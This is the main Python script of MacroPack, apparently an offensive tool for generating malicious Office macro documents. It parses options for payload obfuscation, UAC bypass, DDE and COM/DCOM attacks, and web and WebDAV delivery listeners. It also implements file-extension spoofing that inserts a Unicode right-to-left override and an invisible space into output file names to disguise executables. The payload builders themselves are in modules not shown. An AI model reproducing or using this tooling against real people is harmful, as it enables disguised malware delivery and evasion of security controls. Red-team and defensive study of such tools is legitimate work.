#!/usr/bin/python3
# encoding: utf-8

import os
import sys
import getopt
import logging
import shutil
import psutil
from modules.com_run import ComGenerator
from modules.web_server import ListenServer
from modules.Wlisten_server import WListenServer
from modules.payload_builder_factory import PayloadBuilderFactory
from common import utils, mp_session, help
from common.utils import MSTypes
from common.definitions import VERSION, LOGLEVEL
if sys.platform == "win32":
    try:
        import win32com.client #@UnresolvedImport @UnusedImport
    except:
        print("Error: Could not find win32com.")
        sys.exit(1)
MP_TYPE="Pro"
if utils.checkModuleExist("pro_core"):
    from pro_modules.utilities.dcom_run import DcomGenerator
    from pro_modules.payload_builders.containers import ContainerGenerator
    from pro_core.payload_builder_factory_pro import PayloadBuilderFactoryPro
    from pro_core import arg_mgt_pro, mp_session_pro
else:
    MP_TYPE="Community"

from colorama import init
from termcolor import colored
# {PyArmor Plugins}
# use Colorama to make Termcolor work on Windows too
init()



WORKING_DIR = "temp"

BANNER = help.getToolPres()


def main(argv):
    global MP_TYPE
    logLevel = LOGLEVEL
    # initialize macro_pack session object
    working_directory = os.path.join(os.getcwd(), WORKING_DIR)
    if MP_TYPE == "Pro":
        mpSession = mp_session_pro.MpSessionPro(working_directory, VERSION, MP_TYPE)
    else:
        mpSession = mp_session.MpSession(working_directory, VERSION, MP_TYPE)

    try:
        longOptions = ["embed=", "listen=", "port=", "webdav-listen=", "generate=", "quiet", "input-file=", "encode",
                       "obfuscate", "obfuscate-form", "obfuscate-names", "obfuscate-strings",
                       "obfuscate-names-charset=", "obfuscate-names-minlen=", "obfuscate-names-maxlen=",
                       "file=","template=","listtemplates","listformats","icon=", "start-function=","uac-bypass",
                       "unicode-rtlo=", "dde", "print", "force-yes", "help"]
        shortOptions= "e:l:w:s:f:t:G:hqmop"
        # only for Pro release
        if MP_TYPE == "Pro":
            longOptions.extend(arg_mgt_pro.proArgsLongOptions)
            shortOptions += arg_mgt_pro.proArgsShortOptions
        # Only enabled on windows
        if sys.platform == "win32":
            longOptions.extend(["run=", "run-visible"])

        opts, args = getopt.getopt(argv, shortOptions, longOptions) # @UnusedVariable
    except getopt.GetoptError:
        help.printUsage(BANNER, sys.argv[0])
        sys.exit(2)
    for opt, arg in opts:
        if opt in ("-o", "--obfuscate"):
            mpSession.obfuscateForm =  True
            mpSession.obfuscateNames =  True
            mpSession.obfuscateStrings =  True
        elif opt=="--obfuscate-form":
            mpSession.obfuscateForm =  True
        elif opt=="--obfuscate-names":
            mpSession.obfuscateNames =  True
        elif opt=="--obfuscate-names-charset":
            try:
                mpSession.obfuscatedNamesCharset = arg
            except ValueError:
                help.printUsage(BANNER, sys.argv[0])
                sys.exit(0)
        elif opt=="--obfuscate-names-minlen":
            try:
                mpSession.obfuscatedNamesMinLen = int(arg)
            except ValueError:
                help.printUsage(BANNER, sys.argv[0])
                sys.exit(0)
            if mpSession.obfuscatedNamesMinLen < 4 or mpSession.obfuscatedNamesMinLen > 255:
                help.printUsage(BANNER, sys.argv[0])
                sys.exit(0)
        elif opt=="--obfuscate-names-maxlen":
            try:
                mpSession.obfuscatedNamesMaxLen = int(arg)
            except ValueError:
                help.printUsage(BANNER, sys.argv[0])
                sys.exit(0)
            if mpSession.obfuscatedNamesMaxLen < 4 or mpSession.obfuscatedNamesMaxLen > 255:
                help.printUsage(BANNER, sys.argv[0])
                sys.exit(0)
        elif opt=="--obfuscate-strings":
            mpSession.obfuscateStrings =  True
        elif opt=="-s" or opt=="--start-function":
            mpSession.startFunction =  arg
        elif opt=="-l" or opt=="--listen":
            mpSession.listen = True
            mpSession.listenRoot = os.path.abspath(arg)
        elif opt=="--port":
            mpSession.listenPort = int(arg)
            mpSession.WlistenPort = int(arg)
        elif opt=="--icon":
            mpSession.icon = arg
        elif opt=="-w" or opt=="--webdav-listen":
            mpSession.Wlisten =  True
            mpSession.WRoot = os.path.abspath(arg)
        elif opt == "-f" or opt== "--input-file":
            mpSession.fileInput = arg
        elif opt == "-e" or opt== "--embed":
            mpSession.embeddedFilePath = os.path.abspath(arg)
        elif opt=="-t" or opt=="--template":
            mpSession.template = arg
        elif opt == "--listtemplates":
            help.printTemplatesUsage(BANNER, sys.argv[0])
            sys.exit(0)
        elif opt=="-q" or opt=="--quiet":
            logLevel = "WARN"
        elif opt=="-p" or opt=="--print":
            mpSession.printFile = True
        elif opt == "--dde":
            if sys.platform == "win32":
                mpSession.ddeMode = True
        elif opt == "--run":
            if sys.platform == "win32":
                mpSession.runTarget = os.path.abspath(arg)
        elif opt == "--run-visible":
            if sys.platform == "win32":
                mpSession.runVisible = True
        elif opt == "--force-yes":
            mpSession.forceYes = True
        elif opt=="--uac-bypass":
            mpSession.uacBypass = True
        elif opt == "--unicode-rtlo":
            mpSession.unicodeRtlo = arg
        elif opt in ("-G", "--generate"):
            mpSession.outputFilePath = os.path.abspath(arg)
        elif opt == "--listformats":
            help.printAvailableFormats(BANNER)
            sys.exit(0)
        elif opt=="-h" or opt=="--help":
            help.printUsage(BANNER, sys.argv[0])
            sys.exit(0)
        else:
            if MP_TYPE == "Pro":
                arg_mgt_pro.processProArg(opt, arg, mpSession, BANNER)
            else:
                help.printUsage(BANNER, sys.argv[0])
                sys.exit(0)

    if logLevel == "INFO":
        os.system('cls' if os.name == 'nt' else 'clear')

    # Logging
    logging.basicConfig(level=getattr(logging, logLevel),format="%(message)s", handlers=[utils.ColorLogFiler()])


    logging.info(colored(BANNER, 'green'))

    logging.info(" [+] Preparations...")

    # check input args
    if mpSession.fileInput is None:
        # Argument not supplied, try to get file content from stdin
        if not os.isatty(0): # check if something is being piped
            logging.info("   [-] Waiting for piped input feed...")
            mpSession.stdinContent = sys.stdin.readlines()
            # Close Stdin pipe, so we can call input() later without triggering EOF
            #sys.stdin.close()
            if sys.platform == "win32":
                sys.stdin = open("conIN$")
            else:
                sys.stdin = sys.__stdin__
            
            
    else:
        if not os.path.isfile(mpSession.fileInput):
            logging.error("   [!] ERROR: Could not find %s!" % mpSession.fileInput)
            sys.exit(2)
        else:
            logging.info("   [-] Input file path: %s" % mpSession.fileInput)

    if MP_TYPE == "Pro":
        if mpSession.communityMode:
            logging.warning("   [!] Running in community mode (pro features not applied)")
            MP_TYPE="Community"
        else:
            arg_mgt_pro.verify(mpSession)
        
    
        # Check output file format
    if mpSession.outputFilePath:
        if not os.path.isdir(os.path.dirname(mpSession.outputFilePath)):
            logging.error("   [!] Could not find output folder %s." % os.path.dirname(mpSession.outputFilePath))
            sys.exit(2)
        
        if mpSession.outputFileType == MSTypes.UNKNOWN:
            logging.error("   [!] %s is not a supported extension. Use --listformats to view supported MacroPack formats." % os.path.splitext(mpSession.outputFilePath)[1])
            sys.exit(2)
        else:
            logging.info("   [-] Target output format: %s" %  mpSession.outputFileType)
    elif not mpSession.listen and not mpSession.Wlisten and mpSession.runTarget is None and (MP_TYPE != "Pro" or mpSession.dcomTarget is None):
        logging.error("   [!] You need to provide an output file! (get help using %s -h)" % os.path.basename(utils.getRunningApp()))
        sys.exit(2)


    if not mpSession.isTrojanMode:
        # verify that output file does not already exist
        if os.path.isfile(mpSession.outputFilePath):
            logging.error("   [!] ERROR: Output file %s already exist!" % mpSession.outputFilePath)
            sys.exit(2)

    #Create temporary folder
    logging.info("   [-] Temporary working dir: %s" % working_directory)
    if not os.path.exists(working_directory):
        os.makedirs(working_directory)

    try:
        # Create temporary work file.
        if mpSession.ddeMode or mpSession.template or (mpSession.outputFileType not in MSTypes.VB_FORMATS+[MSTypes.VBA] and not mpSession.htaMacro):
            inputFile = os.path.join(working_directory, "command.cmd")
        else:
            inputFile = os.path.join(working_directory, utils.randomAlpha(9)) + ".vba"
        if mpSession.stdinContent is not None:
            import time
            time.sleep(0.4) # Needed to avoid some weird race condition
            logging.info("   [-] Store std input in file...")
            f = open(inputFile, 'w')
            f.writelines(mpSession.stdinContent)
            f.close()
        else:
            # Create temporary work file
            if mpSession.fileInput is not None:
                # Check there are not binary chars in input fil 
                if utils.isBinaryString(open(mpSession.fileInput, 'rb').read(1024)):
                    logging.error("   [!] ERROR: Invalid format for %s. Input should be text format containing your VBA script." % mpSession.fileInput)
                    logging.info(" [+] Cleaning...")
                    if os.path.isdir(working_directory):
                        shutil.rmtree(working_directory)
                    sys.exit(2)
                logging.info("   [-] Store input file...")
                shutil.copy2(mpSession.fileInput, inputFile)
        
        if os.path.isfile(inputFile): 
            logging.info("   [-] Temporary input file: %s" %  inputFile)
            
            
        # Edit outputfile name to spoof extension if unicodeRtlo option is enabled
        if mpSession.unicodeRtlo:
            # Reminder; mpSession.unicodeRtlo contains the extension we want to spoof, such as "jpg"
            logging.info(" [+] Inject %s false extension with unicode RTLO" % mpSession.unicodeRtlo)
            # Separate document path and extension
            (fileName, fileExtension) = os.path.splitext(mpSession.outputFilePath)
            
            logging.info("   [-] Extension %s " % fileExtension)
            # Append unicode RTLO to file name
            fileName += '\u202e' 
            # Append extension to spoof in reverse order
            fileName += '\u200b' + mpSession.unicodeRtlo[::-1] # Prepend invisible space so filename does not end with flagged extension
            # Append file extension
            fileName +=  fileExtension   
            mpSession.outputFilePath = fileName
            logging.info("   [-] File name modified to: %s" %  mpSession.outputFilePath)
                

        # Retrieve the right payload builder
        if mpSession.outputFileType != MSTypes.UNKNOWN:
            if MP_TYPE == "Pro" and not mpSession.communityMode:
                payloadBuilder = PayloadBuilderFactoryPro().getPayloadBuilder(mpSession)
            else:
                payloadBuilder = PayloadBuilderFactory().getPayloadBuilder(mpSession)
            # Build payload
            if payloadBuilder is not None:
                payloadBuilder.run()
                if MP_TYPE == "Pro":
                    generator = ContainerGenerator(mpSession)
                    generator.run()

        #run com attack
        if mpSession.runTarget:
            generator = ComGenerator(mpSession)
            generator.run()

        if MP_TYPE == "Pro":
            #run dcom attack
            if mpSession.dcom:
                generator = DcomGenerator(mpSession)
                generator.run()

        # Activate Web server
        if mpSession.listen:
            listener = ListenServer(mpSession)
            listener.run()

        # Activate WebDav server
        if mpSession.Wlisten:
            Wlistener = WListenServer(mpSession)
            Wlistener.run()

    except Exception:
        logging.exception(" [!] Exception caught!")
    except KeyboardInterrupt:
        logging.error(" [!] Keyboard interrupt caught!")


    logging.info(" [+] Cleaning...")
    if os.path.isdir(working_directory):
        shutil.rmtree(working_directory)

    logging.info(" Done!\n")


    sys.exit(0)


if __name__ == '__main__':
    # check if running from explorer, if yes restart from cmd line
    running_from = psutil.Process(os.getpid()).parent().parent().name()
    if running_from == 'explorer.exe':
        os.system("cmd.exe /k \"%s\"" % utils.getRunningApp())
    # PyArmor Plugin: checkPlug()
    main(sys.argv[1:])
